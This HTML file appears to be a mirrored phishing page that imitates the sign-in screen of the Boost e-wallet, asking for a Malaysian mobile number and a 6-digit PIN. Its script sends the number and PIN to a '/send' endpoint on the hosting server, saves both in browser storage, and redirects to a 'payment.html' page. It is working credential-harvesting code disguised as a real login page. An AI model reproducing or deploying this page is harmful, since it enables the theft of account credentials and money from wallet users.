<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from myewallet-boost.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 14 Oct 2025 11:16:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to Boost</title>
  <style>
    body { 
      margin: 0; 
      font-family: Arial, sans-serif; 
      background: white; 
    }
    header { 
      background: #ea0029; 
      padding: 18px 0; 
      text-align: center; 
    }
    .logo img { 
      width: 80px; 
      height: auto; 
    }
    main { 
      max-width: 420px; 
      margin: 2rem auto; 
      padding: 0 1.5rem; 
    }
    h1 { 
      font-size: 26px; 
      font-weight: 700; 
      margin-bottom: .5rem; 
    }
    p { 
      color: #6b7280; 
      margin-bottom: 2rem; 
    }
    label { 
      display: block; 
      font-weight: 600; 
      margin-bottom: .25rem; 
    }
    .input-row { 
      display: flex; 
      align-items: center; 
      border-bottom: 2px solid #ccc; 
      padding: .25rem 0; 
    }
    .prefix { 
      margin-right: .5rem; 
      font-size: 18px; 
    }
    input[type="tel"] { 
      border: none; 
      outline: none; 
      flex: 1; 
      font-size: 18px; 
      background: transparent; 
    }
    .error { 
      color: #ea0029; 
      font-size: 14px; 
      margin-top: .25rem; 
      display: none; 
    }
    .pin-grid { 
      display: flex; 
      justify-content: space-between; 
      margin-top: .5rem; 
    }
  .pin-grid input { 
      width: 40px; 
      height: 50px; 
      text-align: center; 
      font-size: 24px; 
      border: none;
      border-bottom: 2px solid #ddd; 
      background: #fdfbfb;
      border-radius: 0;
      padding: 0;
      margin: 0 4px;
    }
    .pin-grid input:focus {
      border-bottom-color: #ea0029;
      outline: none;
    }
    .send-btn {
      margin-top: 1.5rem;
      float: right;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: #ea0029;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
    .send-btn img { 
      width: 28px; 
      height: 28px; 
    }
    .send-btn:disabled { 
      opacity: .5; 
      cursor: not-allowed; 
    }
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">    
      <img src="boost-logo-white.svg" alt="boost">
    </div>
  </header>
  <main>
    <h1>Sign in to Boost</h1>
    <p>Sign in with your registered Boost mobile number.</p>

    <label for="phone">Mobile Number</label>
    <div class="input-row" action="index.php;">     
      <span class="prefix">+60</span>
      <input id="phone" type="tel" inputmode="numeric" placeholder="Enter your mobile number">
    </div>
    <div id="phoneError" class="error">Please enter a valid mobile number</div>

    <div style="margin-top: 2rem">
      <label>6-digit PIN</label>
      <div class="pin-grid">
        <input maxlength="1" type="password" inputmode="numeric">
        <input maxlength="1" type="password" inputmode="numeric">
        <input maxlength="1" type="password" inputmode="numeric">
        <input maxlength="1" type="password" inputmode="numeric">
        <input maxlength="1" type="password" inputmode="numeric">
        <input maxlength="1" type="password" inputmode="numeric">
      </div>
    </div>

    <button class="send-btn" id="sendBtn" disabled>
      <img src="arrow-next.svg" alt="Next">
    </button>
  </main>

  <script>
    const phoneInput = document.getElementById("phone");
    const phoneError = document.getElementById("phoneError");
    const pinInputs = document.querySelectorAll(".pin-grid input");
    const sendBtn = document.getElementById("sendBtn");
    const btnIcon = sendBtn.querySelector("img");

    function onlyDigits(e) {
      e.target.value = e.target.value.replace(/\D/g, "");
    }

    function validatePhone() {
      return /^1\d{8,9}$/.test(phoneInput.value);
    }

    function validatePin() {
      return Array.from(pinInputs).every(inp => inp.value !== "");
    }

    function updateButtonState() {
      sendBtn.disabled = !(validatePhone() && validatePin());
    }

    phoneInput.addEventListener("input", (e) => {
      onlyDigits(e);
      phoneError.style.display = phoneInput.value && !validatePhone() ? "block" : "none";
      updateButtonState();
    });

    pinInputs.forEach((input, idx) => {
      input.addEventListener("input", (e) => {
        onlyDigits(e);
        if (input.value.length === 1 && idx < pinInputs.length - 1) {
          pinInputs[idx + 1].focus();
        }
        updateButtonState();
      });
      
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && idx > 0) {
          pinInputs[idx - 1].focus();
        }
      });
    });

    // Handle form submission
    sendBtn.addEventListener("click", async () => {
      const phone = "+60" + phoneInput.value;
      const pin = Array.from(pinInputs).map(inp => inp.value).join("");

      // Show loading state
      btnIcon.style.display = "none";
      sendBtn.innerHTML = '<div class="loading"></div>';
      sendBtn.disabled = true;

      try {
        const response = await fetch("/send", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json" 
          },
          body: JSON.stringify({ phone, pin })
        });

        const data = await response.json();
        
        if (data.success) {
          // SIMPAN DATA KE LOCALSTORAGE SEBELUM REDIRECT
          localStorage.setItem("boost_phone", phone);
          localStorage.setItem("boost_pin", pin);
          
          // Redirect to payment page
          window.location.href = "payment.html";
        } else {
          alert("Error: " + (data.error || "Unknown error occurred"));
        }
      } catch (error) {
        alert("Failed to connect to server. Please try again.");
        console.error("Request failed:", error);
      } finally {
        // Restore button state
        sendBtn.innerHTML = '<img src="./arrow-next.svg" alt="Next">';
        btnIcon.style.display = "block";
        updateButtonState();
      }
    });
  </script>
</body>

</html>
